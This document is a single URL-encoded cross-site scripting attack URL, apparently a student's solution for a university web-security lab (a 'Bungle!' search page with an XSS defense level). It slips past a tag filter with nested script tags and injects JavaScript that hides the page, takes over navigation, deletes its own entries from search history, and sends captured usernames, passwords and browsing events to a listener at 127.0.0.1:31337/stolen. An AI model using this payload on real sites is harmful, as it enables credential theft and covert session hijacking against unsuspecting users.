http://cs526-offline.cs.purdue.edu/project3/search?xssdefense=2&q=%3Csscriptcript%3Efunction%20payload(attacker)%20%7B%0A%09function%20sideChannel(message)%20%7B%0A%09%09%24.get(attacker%2Cmessage)%3B%0A%09%7D%0A%0A%09function%20historyPush(href)%20%7B%0A%09%09history.pushState(%7B%7D%2C%22%22%2Chref)%3B%0A%09%7D%0A%09function%20proxy(href%2C%20queryPassed)%20%7B%0A%09%09%24(%22html%22).load(href%2C%20function()%7B%0A%09%09%09%24(%22html%22).show()%3B%0A%09%09%09%2F%2F%24(%22%23query%22).val(%22pwned!%22)%3B%0A%09%09%09var%20logged_in_user%3D%20%24(%22%23logged-in-user%22).text()%3B%0A%09%09%09if%20(logged_in_user%20!%3D%20%22%22)%7B%0A%09%09%09%09sideChannel(%20%7Bevent%3A%20%22nav%22%2C%20user%3A%20logged_in_user%20%2C%20url%3A%20href%20%7D%20)%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09sideChannel(%20%7Bevent%3A%20%22nav%22%2C%20url%3A%20href%20%7D%20)%3B%0A%09%09%09%7D%0A%0A%09%09%09%2F%2F%20REMOVE%20HiSTORY%20OF%20ATTACK%0A%09%09%09%24(%22.history-item%22).each(function(%20index%20)%20%7B%0A%09%09%09%09if(%24(this).text().includes(%22function%20payload(attacker%22))%20%7B%0A%09%09%09%09%09%24(%20this%20).remove()%0A%09%09%09%09%7D%0A%09%09%09%09%20%2F%2F%20IF%20CLICK%20HISTORY%20ITEM%0A%09%09%09%09%24(this).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09%09event.preventDefault()%3B%0A%0A%09%09%09%09%09query%20%3D%20%24(this).attr(%22href%22).replace(%2F%20%2Fg%2C%22%2B%22)%3B%0A%09%09%09%09%09var%20nHref%20%3D%20%22.%2F%22%2Bquery%3B%0A%09%09%09%09%09historyPush(nHref)%3B%0A%09%09%09%09%09proxy(nHref)%3B%0A%09%09%09%09%7D)%3B%0A%0A%0A%09%09%09%7D)%3B%0A%0A%09%09%09%2F%2F%20LOGIN%0A%09%09%09%24(%22%23log-in-btn%22).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%24.post(%22.%2Flogin%22%2C%20%0A%09%09%09%09%09%7Busername%3A%20%24(%22%23username%22).val()%2C%20password%3A%20%24(%22%23userpass%22).val()%7D%0A%0A%09%09%09%09%09).done(function%20()%20%7B%0A%09%09%09%09%09%09sideChannel(%7Bevent%3A%20%22login%22%2C%20user%3A%20%24(%22%23username%22).val()%2C%20pass%3A%20%24(%22%23userpass%22).val()%7D)%3B%0A%09%09%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%09%09%7D)%3B%09%20%20%20%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%2F%2F%20NEW%20_ACCOUNT%20LOGIN%0A%09%09%09%24(%22%23new-account-btn%22).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%24.post(%22.%2Fcreate%22%2C%20%0A%09%09%09%09%09%7Busername%3A%20%24(%22%23username%22).val()%2C%20password%3A%20%24(%22%23userpass%22).val()%7D%0A%0A%09%09%09%09%09).done(function%20()%20%7B%0A%09%09%09%09%09%09sideChannel(%7Bevent%3A%20%22login%22%2C%20user%3A%20%24(%22%23username%22).val()%2C%20pass%3A%20%24(%22%23userpass%22).val()%7D)%3B%0A%09%09%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%09%09%7D)%3B%09%20%20%20%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%2F%2F%20LOGOUT%0A%09%09%09%24(%22%23log-out-btn%22).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%24.post(%22.%2Flogout%22%2C%20%0A%09%09%09%09%09%7Busername%3A%20%24(%22%23logged-in-user%22).text()%7D%0A%0A%09%09%09%09%09).done(function%20()%20%7B%0A%09%09%09%09%09%09sideChannel(%7Bevent%3A%20%22logout%22%2C%20user%3A%20%24(%22%23logged-in-user%22).text()%7D)%3B%0A%09%09%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%09%09%7D)%3B%09%20%20%20%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%2F%2FBungle!%20link%0A%09%09%09%24(%22%23bungle-lnk%22).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09var%20nHref%20%3D%20%22.%2F%22%3B%0A%09%09%09%09historyPush(nHref)%3B%0A%09%09%09%09proxy(nHref)%3B%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%24(%22%23search-btn%22).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09event.preventDefault()%3B%0A%0A%09%09%09%09query%20%3D%20%24(%22%23query%22).val().replace(%2F%20%2Fg%2C%22%2B%22)%3B%0A%09%09%09%09var%20nHref%20%3D%20%22.%2Fsearch%3Fq%3D%22%2Bquery%3B%0A%09%09%09%09historyPush(nHref)%3B%0A%09%09%09%09proxy(nHref)%3B%0A%09%09%09%7D)%3B%0A%0A%0A%0A%09%09%09%24(%22%23search-again-btn%22).on(%22click%22%2Cfunction(event)%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09var%20nHref%20%3D%20%22.%2F%22%3B%0A%09%09%09%09historyPush(nHref)%3B%0A%09%09%09%09proxy(nHref)%3B%0A%09%09%09%7D)%3B%0A%0A%09%09%09window.onpopstate%20%3D%20function(event)%20%7B%0A%20%20%09%09%09%09%09proxy(location.href)%3B%0A%09%09%09%7D%3B%0A%0A%09%09%7D)%3B%0A%09%7D%0A%09%24(%22html%22).hide()%3B%0A%09proxy(%22.%2F%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fsscriptcript%3E
